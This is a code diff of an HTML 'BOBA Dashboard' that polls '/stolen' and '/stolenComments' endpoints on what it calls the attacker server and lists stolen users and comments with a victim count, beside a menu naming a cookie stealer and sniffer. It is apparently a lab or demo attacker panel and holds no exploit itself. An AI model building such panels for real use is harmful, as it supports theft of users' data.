@@ -3,12 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sylvanas is Warchief</title>
+    <title>BOBA Dashboard</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Navbar Included Here -->
-    <div id="navbar-container"></div>
 
     <!-- Dashboard Header -->
     <section>
@@ -36,7 +34,7 @@
         <div class="dashboard-item card">
             <div class="card-header">Cybersecurity Tools</div>
             <div class="card-content">
-                <ul>
+                <ul id="tools-list">
                     <li>Tool 1: Exploit Finder</li>
                     <li>Tool 2: Cookie Stealer</li>
                     <li>Tool 3: Traffic Sniffer</li>
@@ -48,10 +46,62 @@
 
     <script src="script.js"></script>
     <script>
-        
-        fetch('/navbar.html')
-            .then(response => response.text())
-            .then(data => document.getElementById('navbar-container').innerHTML = data);
+        // Dashboard traffic information and updates
+        let victimCount = 0;
+        let trafficCount = 0;
+
+        // Function to refresh traffic stats
+        function refreshTraffic() {
+            // Update the victim count and traffic count with every refresh
+            document.getElementById("victim-count").textContent = victimCount;
+            document.getElementById("traffic-count").textContent = trafficCount;
+            document.getElementById("last-update").textContent = new Date().toLocaleTimeString();
+        }
+
+        // Fetch users and comments from the attacker server
+        function fetchData() {
+            fetch("/stolen")
+                .then(res => res.json())
+                .then(users => {
+                    // Update users list
+                    document.getElementById("users").innerHTML = users.map(u => `<li>${u}</li>`).join("");
+                    // Update victim count
+                    victimCount = users.length; // Total number of users
+                    trafficCount = Math.floor(Math.random() * 100); // Simulate real-time traffic count
+                    refreshTraffic(); // Call refreshTraffic after fetching and updating the data
+                });
+            
+            fetch("/stolenComments")
+                .then(res => res.json())
+                .then(comments => {
+                    // Update comments list
+                    document.getElementById("comments").innerHTML = comments.map(c => `<li>${c}</li>`).join("");
+                });
+        }
+
+        // Set up the "Refresh" button event listener after DOM content is loaded
+        document.addEventListener("DOMContentLoaded", function() {
+            // Ensure refreshTraffic is defined and the button is found
+            const refreshButton = document.getElementById("refresh-btn");
+            if (refreshButton) {
+                refreshButton.addEventListener("click", refreshTraffic); // Bind click event to refreshTraffic
+            }
+
+            // Fetch data every 2 seconds
+            setInterval(fetchData, 2000);
+
+            // Fetch data once on page load to initialize
+            fetchData();
+        });
+
+        // Display tool information
+        function displayToolInfo() {
+            console.log("Tools are loaded.");
+        }
+
+        window.onload = () => {
+            displayToolInfo();  // Log message when tools are ready
+        };
     </script>
 </body>
 </html>
